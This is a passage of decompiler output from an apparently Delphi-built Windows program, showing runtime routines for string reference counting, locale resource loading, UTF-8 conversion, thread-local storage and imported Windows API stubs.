    if (*ppiVar1 == (int *)0x0) {
      ppcVar2 = *(char ***)(*(byte *)(param_2 + 1) + 6 + param_2);
      if ((ppcVar2 != (char **)0x0) && (ppiVar3[-1] != (int *)0x0)) {
        ppiVar3 = FUN_00404a80(ppiVar3,*ppcVar2,(int)ppiVar3[-1]);
      }
      FUN_004026b0((int)(ppiVar3 + -2));
    }
  }
  return param_1;
}



void FUN_00404fd0(int *param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if (param_2 != 0) {
    LOCK();
    *(int *)(param_2 + -8) = *(int *)(param_2 + -8) + 1;
    UNLOCK();
  }
  if (iVar2 != 0) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (*piVar1 == 0) {
      *(int *)(iVar2 + -8) = *(int *)(iVar2 + -8) + 1;
      FUN_00404f94(param_1,param_3);
    }
  }
  *param_1 = param_2;
  return;
}



PVOID FUN_00404ff8(LPCVOID param_1)

{
  _MEMORY_BASIC_INFORMATION local_1c;
  
  VirtualQuery(param_1,&local_1c,0x1c);
  if (local_1c.State != 0x1000) {
    local_1c.AllocationBase = (PVOID)0x0;
  }
  return local_1c.AllocationBase;
}



undefined4 FUN_00405020(int param_1)

{
  HMODULE pHVar1;
  CHAR local_110 [264];
  
  if (*(int *)(param_1 + 0x10) == 0) {
    GetModuleFileNameA(*(HMODULE *)(param_1 + 4),local_110,0x105);
    pHVar1 = FUN_0040525c(local_110);
    *(HMODULE *)(param_1 + 0x10) = pHVar1;
    if (pHVar1 == (HMODULE)0x0) {
      *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(param_1 + 4);
    }
  }
  return *(undefined4 *)(param_1 + 0x10);
}



void FUN_00405068(int param_1)

{
  int *piVar1;
  
  piVar1 = DAT_0041803c;
  if (DAT_0041803c != (int *)0x0) {
    do {
      if (((param_1 == piVar1[1]) || (param_1 == piVar1[2])) || (param_1 == piVar1[3])) {
        FUN_00405020((int)piVar1);
        return;
      }
      piVar1 = (int *)*piVar1;
    } while (piVar1 != (int *)0x0);
  }
  return;
}



void thunk_FUN_00405098(LPCSTR param_1)

{
  for (; (*param_1 != '\0' && (*param_1 != '\\')); param_1 = CharNextA(param_1)) {
  }
  return;
}



void FUN_00405098(LPCSTR param_1)

{
  for (; (*param_1 != '\0' && (*param_1 != '\\')); param_1 = CharNextA(param_1)) {
  }
  return;
}



char * FUN_004050a4(char *param_1,int param_2)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  char *pcVar3;
  LPCSTR pCVar4;
  HANDLE hFindFile;
  int iVar5;
  CHAR local_253 [261];
  undefined local_14e [322];
  int local_c;
  char *local_8;
  
  local_14e._318_4_ = param_1;
  local_c = param_2;
  local_8 = param_1;
  hModule = GetModuleHandleA(s_kernel32_dll_00405238);
  if (((hModule == (HMODULE)0x0) ||
      (pFVar1 = GetProcAddress(hModule,s_GetLongPathNameA_00405248), pFVar1 == (FARPROC)0x0)) ||
     (iVar2 = (*pFVar1)(), iVar2 == 0)) {
    if (*local_8 == '\\') {
      if (local_8[1] != '\\') {
        return (char *)local_14e._318_4_;
      }
      pcVar3 = (char *)thunk_FUN_00405098(local_8 + 2);
      if (*pcVar3 == '\0') {
        return (char *)local_14e._318_4_;
      }
      pcVar3 = (char *)thunk_FUN_00405098(pcVar3 + 1);
      if (*pcVar3 == '\0') {
        return (char *)local_14e._318_4_;
      }
    }
    else {
      pcVar3 = local_8 + 2;
    }
    iVar2 = (int)pcVar3 - (int)local_8;
    lstrcpynA(local_253,local_8,iVar2 + 1);
    while (*pcVar3 != '\0') {
      pCVar4 = (LPCSTR)thunk_FUN_00405098(pcVar3 + 1);
      if (0x105 < (int)(pCVar4 + (iVar2 - (int)pcVar3) + 1)) {
        return (char *)local_14e._318_4_;
      }
      lstrcpynA(local_253 + iVar2,pcVar3,(int)(pCVar4 + (1 - (int)pcVar3)));
      hFindFile = FindFirstFileA(local_253,(LPWIN32_FIND_DATAA)local_14e);
      if (hFindFile == (HANDLE)0xffffffff) {
        return (char *)local_14e._318_4_;
      }
      FindClose(hFindFile);
      iVar5 = lstrlenA(local_14e + 0x2c);
      if (0x105 < iVar5 + iVar2 + 2) {
        return (char *)local_14e._318_4_;
      }
      local_253[iVar2] = '\\';
      lstrcpynA(local_253 + iVar2 + 1,local_14e + 0x2c,0x104 - iVar2);
      iVar5 = lstrlenA(local_14e + 0x2c);
      iVar2 = iVar2 + iVar5 + 1;
      pcVar3 = pCVar4;
    }
    lstrcpynA(local_8,local_253,local_c);
  }
  else {
    lstrcpynA(local_8,local_253,local_c);
  }
  return (char *)local_14e._318_4_;
}



HMODULE FUN_0040525c(LPCSTR param_1)

{
  LSTATUS LVar1;
  HMODULE pHVar2;
  LCID Locale;
  char *pcVar3;
  LPSTR lpString1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  LCTYPE LCType;
  int iVar5;
  char local_121 [261];
  DWORD local_1c;
  BYTE local_16 [4];
  undefined local_12;
  char local_11 [2];
  undefined local_f;
  HKEY local_c;
  LPCSTR local_8;
  
  local_8 = param_1;
  GetModuleFileNameA((HMODULE)0x0,local_121,0x105);
  local_16[0] = '\0';
  LVar1 = RegOpenKeyExA((HKEY)0x80000001,s_Software_Borland_Locales_0040548c,0,0xf0019,&local_c);
  if (LVar1 != 0) {
    LVar1 = RegOpenKeyExA((HKEY)0x80000002,s_Software_Borland_Locales_0040548c,0,0xf0019,&local_c);
    if (LVar1 != 0) {
      LVar1 = RegOpenKeyExA((HKEY)0x80000001,s_Software_Borland_Delphi_Locales_004054a8,0,0xf0019,
                            &local_c);
      if (LVar1 != 0) {
        lstrcpynA(local_121,local_8,0x105);
        iVar5 = 5;
        pcVar3 = local_11;
        LCType = 3;
        Locale = GetThreadLocale();
        GetLocaleInfoA(Locale,LCType,pcVar3,iVar5);
        pHVar2 = (HMODULE)0x0;
        if ((local_121[0] != '\0') && ((local_11[0] != '\0' || (local_16[0] != '\0')))) {
          iVar5 = lstrlenA(local_121);
          for (pcVar3 = local_121 + iVar5; (*pcVar3 != '.' && (pcVar3 != local_121));
              pcVar3 = pcVar3 + -1) {
          }
          if (pcVar3 != local_121) {
            lpString1 = pcVar3 + 1;
            if (local_16[0] != '\0') {
              lstrcpynA(lpString1,(LPCSTR)local_16,0x105 - ((int)lpString1 - (int)local_121));
              pHVar2 = LoadLibraryExA(local_121,(HANDLE)0x0,2);
            }
            if ((pHVar2 == (HMODULE)0x0) && (local_11[0] != '\0')) {
              lstrcpynA(lpString1,local_11,0x105 - ((int)lpString1 - (int)local_121));
              pHVar2 = LoadLibraryExA(local_121,(HANDLE)0x0,2);
              if (pHVar2 == (HMODULE)0x0) {
                local_f = 0;
                lstrcpynA(lpString1,local_11,0x105 - ((int)lpString1 - (int)local_121));
                pHVar2 = LoadLibraryExA(local_121,(HANDLE)0x0,2);
              }
            }
          }
        }
        return pHVar2;
      }
    }
  }
  uVar4 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xfffffec8;
  local_1c = 5;
  FUN_004050a4(local_121,0x105);
  LVar1 = RegQueryValueExA(local_c,local_121,(LPDWORD)0x0,(LPDWORD)0x0,local_16,&local_1c);
  if (LVar1 != 0) {
    LVar1 = RegQueryValueExA(local_c,&LAB_004054c8,(LPDWORD)0x0,(LPDWORD)0x0,local_16,&local_1c);
    if (LVar1 != 0) {
      local_16[0] = '\0';
    }
  }
  local_12 = 0;
  *in_FS_OFFSET = uVar4;
  pHVar2 = (HMODULE)RegCloseKey(local_c);
  return pHVar2;
}



void FUN_004054cc(undefined4 param_1)

{
  FUN_004054dc(param_1);
  return;
}



void FUN_004054d4(int *param_1)

{
  FUN_004054fc(param_1);
  return;
}



void FUN_004054dc(undefined4 param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_00402690(8);
  *puVar1 = DAT_00418040;
  puVar1[1] = param_1;
  DAT_00418040 = puVar1;
  return;
}



void FUN_004054fc(int *param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  
  ppiVar2 = DAT_00418040;
  if ((DAT_00418040 != (int **)0x0) && (DAT_00418040[1] == param_1)) {
    DAT_00418040 = (int **)*DAT_00418040;
    FUN_004026b0((int)ppiVar2);
    return;
  }
  if (DAT_00418040 != (int **)0x0) {
    do {
      ppiVar1 = (int **)*ppiVar2;
      if ((ppiVar1 != (int **)0x0) && (ppiVar1[1] == param_1)) {
        *ppiVar2 = *ppiVar1;
        FUN_004026b0((int)ppiVar1);
        return;
      }
      ppiVar2 = (int **)*ppiVar2;
    } while (ppiVar2 != (int **)0x0);
  }
  return;
}



void FUN_0040555c(undefined4 param_1,undefined4 param_2,undefined *param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  int *local_c;
  
  local_c = DAT_00418040;
  if (DAT_00418040 != (int *)0x0) {
    do {
      puStack_20 = &LAB_00405597;
      uStack_24 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStack_24;
      puStack_1c = &stack0xfffffffc;
      (*(code *)local_c[1])(param_1,param_2,param_3);
      *in_FS_OFFSET = uStack_24;
      local_c = (int *)*local_c;
      param_3 = puStack_1c;
      param_2 = uStack_24;
    } while (local_c != (int *)0x0);
  }
  return;
}



void FUN_004055b8(undefined4 *param_1)

{
  *param_1 = DAT_0041803c;
  DAT_0041803c = param_1;
  return;
}



void FUN_004055c8(undefined4 *param_1,undefined4 param_2,undefined *param_3)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 *local_8;
  
  puStack_c = &stack0xfffffffc;
  puStack_10 = &LAB_0040562c;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  local_8 = param_1;
  FUN_0040555c(param_1[1],0,param_3);
  *in_FS_OFFSET = uStack_14;
  puVar1 = DAT_0041803c;
  if (local_8 == DAT_0041803c) {
    DAT_0041803c = (undefined4 *)*local_8;
  }
  else {
    for (; puVar1 != (undefined4 *)0x0; puVar1 = (undefined4 *)*puVar1) {
      if ((undefined4 *)*puVar1 == local_8) {
        *puVar1 = *local_8;
        return;
      }
    }
  }
  return;
}



int ** FUN_00405638(int **param_1)

{
  int **ppiVar1;
  
  ppiVar1 = (int **)*param_1;
  if (ppiVar1 != (int **)0x0) {
    *param_1 = (int *)0x0;
    (*(code *)(*ppiVar1)[2])();
    param_1 = ppiVar1;
  }
  return param_1;
}



void FUN_00405650(int **param_1,int **param_2)

{
  int *piVar1;
  
  if (param_2 == (int **)0x0) {
    piVar1 = *param_1;
    *param_1 = (int *)0x0;
    if (piVar1 != (int *)0x0) {
      (**(code **)(*piVar1 + 8))();
    }
    return;
  }
  (*(code *)(*param_2)[1])();
  piVar1 = *param_2;
  *param_2 = (int *)param_1;
  if (piVar1 == (int *)0x0) {
    return;
  }
  (**(code **)(*piVar1 + 8))();
  return;
}



LONG FUN_004056e4(undefined param_1,undefined param_2,undefined param_3,int *param_4)

{
  LONG LVar1;
  
  LVar1 = InterlockedDecrement(param_4 + 1);
  if (LVar1 == 0) {
    (**(code **)(*param_4 + -4))(param_4,1);
  }
  return LVar1;
}



int FUN_0040570c(int param_1,uint param_2,int param_3,uint param_4)

{
  ushort uVar1;
  uint uVar2;
  byte bVar3;
  int iVar4;
  uint uVar5;
  
  iVar4 = 0;
  if (param_3 != 0) {
    uVar5 = 0;
    uVar2 = 0;
    if (param_1 == 0) {
      if (param_4 != 0) {
        do {
          uVar1 = *(ushort *)(param_3 + uVar2 * 2);
          uVar2 = uVar2 + 1;
          if (0x7f < uVar1) {
            if (0x7ff < uVar1) {
              uVar5 = uVar5 + 1;
            }
            uVar5 = uVar5 + 1;
          }
          uVar5 = uVar5 + 1;
        } while (uVar2 < param_4);
      }
    }
    else {
      while ((uVar2 < param_4 && (uVar5 < param_2))) {
        uVar1 = *(ushort *)(param_3 + uVar2 * 2);
        uVar2 = uVar2 + 1;
        bVar3 = (byte)uVar1;
        if (uVar1 < 0x80) {
          *(byte *)(param_1 + uVar5) = bVar3;
          uVar5 = uVar5 + 1;
        }
        else if (uVar1 < 0x800) {
          if (param_2 < uVar5 + 2) break;
          *(byte *)(param_1 + uVar5) = (byte)(uVar1 >> 6) | 0xc0;
          *(byte *)(param_1 + 1 + uVar5) = bVar3 & 0x3f | 0x80;
          uVar5 = uVar5 + 2;
        }
        else {
          if (param_2 < uVar5 + 3) break;
          *(byte *)(param_1 + uVar5) = (byte)(uVar1 >> 0xc) | 0xe0;
          *(byte *)(param_1 + 1 + uVar5) = (byte)(uVar1 >> 6) & 0x3f | 0x80;
          *(byte *)(param_1 + 2 + uVar5) = bVar3 & 0x3f | 0x80;
          uVar5 = uVar5 + 3;
        }
      }
      if (param_2 <= uVar5) {
        uVar5 = param_2 - 1;
      }
      *(undefined *)(param_1 + uVar5) = 0;
    }
    iVar4 = uVar5 + 1;
  }
  return iVar4;
}



int FUN_004057e8(int param_1,uint param_2,int param_3,uint param_4)

{
  byte *pbVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  int local_14;
  
  if (param_3 == 0) {
    local_14 = 0;
  }
  else {
    uVar3 = 0;
    uVar5 = 0;
    if (param_1 == 0) {
      if (param_4 != 0) {
        do {
          uVar6 = uVar5 + 1;
          if ((*(byte *)(param_3 + uVar5) & 0x80) != 0) {
            if (param_4 <= uVar6) {
              return -1;
            }
            if ((*(byte *)(param_3 + uVar5) & 0x20) != 0) {
              pbVar1 = (byte *)(param_3 + uVar6);
              uVar6 = uVar5 + 2;
              if ((*pbVar1 & 0xc0) != 0x80) {
                return -1;
              }
              if (param_4 <= uVar6) {
                return -1;
              }
            }
            pbVar1 = (byte *)(param_3 + uVar6);
            uVar6 = uVar6 + 1;
            if ((*pbVar1 & 0xc0) != 0x80) {
              return -1;
            }
          }
          uVar3 = uVar3 + 1;
          uVar5 = uVar6;
        } while (uVar6 < param_4);
      }
    }
    else {
      for (; (uVar5 < param_4 && (uVar3 < param_2)); uVar3 = uVar3 + 1) {
        bVar2 = *(byte *)(param_3 + uVar5);
        uVar6 = uVar5 + 1;
        if ((bVar2 & 0x80) == 0) {
          *(ushort *)(param_1 + uVar3 * 2) = (ushort)bVar2;
        }
        else {
          if (param_4 <= uVar6) {
            return -1;
          }
          uVar4 = bVar2 & 0x3f;
          if ((bVar2 & 0x20) != 0) {
            pbVar1 = (byte *)(param_3 + uVar6);
            uVar6 = uVar5 + 2;
            if ((*pbVar1 & 0xc0) != 0x80) {
              return -1;
            }
            if (param_4 <= uVar6) {
              return -1;
            }
            uVar4 = (uint)(*pbVar1 & 0x3f) | uVar4 << 6;
          }
          pbVar1 = (byte *)(param_3 + uVar6);
          uVar6 = uVar6 + 1;
          if ((*pbVar1 & 0xc0) != 0x80) {
            return -1;
          }
          *(ushort *)(param_1 + uVar3 * 2) = (ushort)(*pbVar1 & 0x3f) | (ushort)(uVar4 << 6);
        }
        uVar5 = uVar6;
      }
      if (param_2 <= uVar3) {
        uVar3 = param_2 - 1;
      }
      *(undefined2 *)(param_1 + uVar3 * 2) = 0;
    }
    local_14 = uVar3 + 1;
  }
  return local_14;
}



void FUN_00405920(int *param_1,int *param_2)

{
  uint uVar1;
  int iVar2;
  undefined *puVar3;
  undefined *puVar4;
  undefined4 *in_FS_OFFSET;
  bool bVar5;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  undefined4 *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack_18 = &LAB_004059bf;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_0040405c(param_2);
  bVar5 = true;
  FUN_0040485c(param_1,(int *)0x0);
  if (!bVar5) {
    uVar1 = FUN_00404850((uint)param_1);
    FUN_00404628((int *)&local_8,uVar1 * 3);
    uVar1 = FUN_00404850((uint)param_1);
    iVar2 = FUN_004042f8((int)local_8);
    puVar3 = FUN_00404840((undefined *)param_1);
    puVar4 = FUN_004044f8((undefined *)local_8);
    iVar2 = FUN_0040570c((int)puVar4,iVar2 + 1,(int)puVar3,uVar1);
    if (iVar2 < 1) {
      FUN_0040405c((int *)&local_8);
    }
    else {
      FUN_00404628((int *)&local_8,iVar2 - 1);
    }
    FUN_004040b0(param_2,local_8);
  }
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_004059c6;
  puStack_18 = (undefined *)0x4059be;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_004059cc(undefined *param_1,BSTR *param_2)

{
  UINT UVar1;
  uint uVar2;
  uint uVar3;
  undefined *puVar4;
  undefined *puVar5;
  int iVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  OLECHAR *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (OLECHAR *)0x0;
  puStack_18 = &LAB_00405a63;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_004046e4(param_2);
  if (param_1 != (undefined *)0x0) {
    UVar1 = FUN_004042f8((int)param_1);
    FUN_0040492c(&local_8,UVar1);
    uVar2 = FUN_004042f8((int)param_1);
    uVar3 = FUN_00404850((uint)local_8);
    puVar4 = FUN_004044f8(param_1);
    puVar5 = FUN_00404840((undefined *)local_8);
    iVar6 = FUN_004057e8((int)puVar5,uVar3 + 1,(int)puVar4,uVar2);
    if (iVar6 < 1) {
      FUN_004046e4(&local_8);
    }
    else {
      FUN_0040492c(&local_8,iVar6 - 1);
    }
    FUN_00404720(param_2,local_8);
  }
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00405a6a;
  puStack_18 = (undefined *)0x405a62;
  FUN_004046e4(&local_8);
  return;
}



void FUN_00405a70(LPCSTR param_1,int *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  int *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (int *)0x0;
  puStack_18 = &LAB_00405ab3;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_00404830((BSTR *)&local_8,param_1);
  FUN_00405920(local_8,param_2);
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00405aba;
  puStack_18 = (undefined *)0x405ab2;
  FUN_004046e4((BSTR *)&local_8);
  return;
}



void FUN_00405ac0(int **param_1,int *param_2)

{
  HINSTANCE hInstance;
  uint uVar1;
  int *uID;
  undefined4 *lpBuffer;
  int cchBufferMax;
  undefined4 local_408 [256];
  
  lpBuffer = local_408;
  if (param_1 != (int **)0x0) {
    if ((int)param_1[1] < 0x10000) {
      cchBufferMax = 0x400;
      uID = param_1[1];
      hInstance = (HINSTANCE)FUN_00405068(**param_1);
      uVar1 = LoadStringA(hInstance,(UINT)uID,(LPSTR)lpBuffer,cchBufferMax);
      FUN_0040414c(param_2,local_408,uVar1);
    }
    else {
      FUN_00404254(param_2,param_1[1]);
    }
  }
  return;
}



void FUN_00405b18(LCID param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  byte *local_14;
  undefined4 local_f;
  int local_8;
  
  puStack_1c = &stack0xfffffffc;
  local_14 = (byte *)0x0;
  puStack_20 = &LAB_00405b7e;
  uStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_24;
  GetLocaleInfoA(param_1,0x1004,(LPSTR)&local_f,7);
  FUN_004042cc((int *)&local_14,&local_f,7);
  FUN_00402ee0(local_14,&local_8);
  *in_FS_OFFSET = uStack_24;
  puStack_1c = &LAB_00405b85;
  puStack_20 = (undefined *)0x405b7d;
  FUN_0040405c((int *)&local_14);
  return;
}



HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405cb4. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



HLOCAL __stdcall LocalAlloc(UINT uFlags,SIZE_T uBytes)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405cbc. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalAlloc(uFlags,uBytes);
  return pvVar1;
}



LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405cc4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = TlsGetValue(dwTlsIndex);
  return pvVar1;
}



BOOL __stdcall TlsSetValue(DWORD dwTlsIndex,LPVOID lpTlsValue)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ccc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TlsSetValue(dwTlsIndex,lpTlsValue);
  return BVar1;
}



void FUN_00405cd4(SIZE_T param_1)

{
  LocalAlloc(0x40,param_1);
  return;
}



undefined4 FUN_00405ce0(void)

{
  return 0xc;
}



void FUN_00405ce8(void)

{
  SIZE_T SVar1;
  LPVOID lpTlsValue;
  
  SVar1 = FUN_00405ce0();
  if (SVar1 != 0) {
    if (_tls_index == 0xffffffff) {
      FUN_00404050(0xe2);
    }
    lpTlsValue = (LPVOID)FUN_00405cd4(SVar1);
    if (lpTlsValue == (LPVOID)0x0) {
      FUN_00404050(0xe2);
    }
    else {
      TlsSetValue(_tls_index,lpTlsValue);
    }
  }
  return;
}



LPVOID FUN_00405d2c(void)

{
  LPVOID pvVar1;
  int in_FS_OFFSET;
  
  if (DAT_0041965c == '\0') {
    return *(LPVOID *)(*(int *)(in_FS_OFFSET + 0x2c) + _tls_index * 4);
  }
  pvVar1 = TlsGetValue(_tls_index);
  if (pvVar1 != (LPVOID)0x0) {
    return pvVar1;
  }
  FUN_00405ce8();
  pvVar1 = TlsGetValue(_tls_index);
  if (pvVar1 != (LPVOID)0x0) {
    return pvVar1;
  }
  return DAT_00419668;
}



void FUN_00405d6c(void)

{
  FUN_004055b8((undefined4 *)&DAT_004180a8);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00405d78(undefined4 param_1)

{
  _tls_index = 0;
  _DAT_004180ac = GetModuleHandleA((LPCSTR)0x0);
  _DAT_004180b0 = 0;
  _DAT_004180b4 = 0;
  DAT_00419660 = _DAT_004180ac;
  FUN_00405d6c();
  FUN_00403dc8(param_1,0x4180a8);
  return;
}



LSTATUS __stdcall RegCloseKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e2c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey(hKey);
  return LVar1;
}



LSTATUS __stdcall
RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,
               REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,
               LPDWORD lpdwDisposition)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e34. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCreateKeyExA(hKey,lpSubKey,Reserved,lpClass,dwOptions,samDesired,lpSecurityAttributes,
                          phkResult,lpdwDisposition);
  return LVar1;
}



LSTATUS __stdcall RegFlushKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e3c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegFlushKey(hKey);
  return LVar1;
}



LSTATUS __stdcall
RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e44. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA(hKey,lpSubKey,ulOptions,samDesired,phkResult);
  return LVar1;
}



LSTATUS __stdcall
RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,
                LPDWORD lpcbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e4c. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryValueExA(hKey,lpValueName,lpReserved,lpType,lpData,lpcbData);
  return LVar1;
}



LSTATUS __stdcall
RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,BYTE *lpData,DWORD cbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e54. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegSetValueExA(hKey,lpValueName,Reserved,dwType,lpData,cbData);
  return LVar1;
}



BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e5c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle(hObject);
  return BVar1;
}



int __stdcall
CompareStringA(LCID Locale,DWORD dwCmpFlags,PCNZCH lpString1,int cchCount1,PCNZCH lpString2,
              int cchCount2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e64. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = CompareStringA(Locale,dwCmpFlags,lpString1,cchCount1,lpString2,cchCount2);
  return iVar1;
}



BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e6c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CopyFileA(lpExistingFileName,lpNewFileName,bFailIfExists);
  return BVar1;
}



BOOL __stdcall CreateDirectoryA(LPCSTR lpPathName,LPSECURITY_ATTRIBUTES lpSecurityAttributes)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e74. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CreateDirectoryA(lpPathName,lpSecurityAttributes);
  return BVar1;
}



HANDLE __stdcall
CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes,BOOL bManualReset,BOOL bInitialState,
            LPCSTR lpName)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e7c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateEventA(lpEventAttributes,bManualReset,bInitialState,lpName);
  return pvVar1;
}



HANDLE __stdcall
CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
           LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
           DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e84. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
  return pvVar1;
}



void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00405e8c. Too many branches
                    // WARNING: Treating indirect jump as call
  DeleteCriticalSection(lpCriticalSection);
  return;
}



BOOL __stdcall DeleteFileA(LPCSTR lpFileName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405e94. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DeleteFileA(lpFileName);
  return BVar1;
}



void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00405e9c. Too many branches
                    // WARNING: Treating indirect jump as call
  EnterCriticalSection(lpCriticalSection);
  return;
}



BOOL __stdcall
EnumCalendarInfoA(CALINFO_ENUMPROCA lpCalInfoEnumProc,LCID Locale,CALID Calendar,CALTYPE CalType)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ea4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = EnumCalendarInfoA(lpCalInfoEnumProc,Locale,Calendar,CalType);
  return BVar1;
}



BOOL __stdcall FileTimeToDosDateTime(FILETIME *lpFileTime,LPWORD lpFatDate,LPWORD lpFatTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405eac. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FileTimeToDosDateTime(lpFileTime,lpFatDate,lpFatTime);
  return BVar1;
}



BOOL __stdcall FileTimeToLocalFileTime(FILETIME *lpFileTime,LPFILETIME lpLocalFileTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405eb4. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FileTimeToLocalFileTime(lpFileTime,lpLocalFileTime);
  return BVar1;
}



BOOL __stdcall FindClose(HANDLE hFindFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ebc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindClose(hFindFile);
  return BVar1;
}



HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00405ec4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  return pvVar1;
}



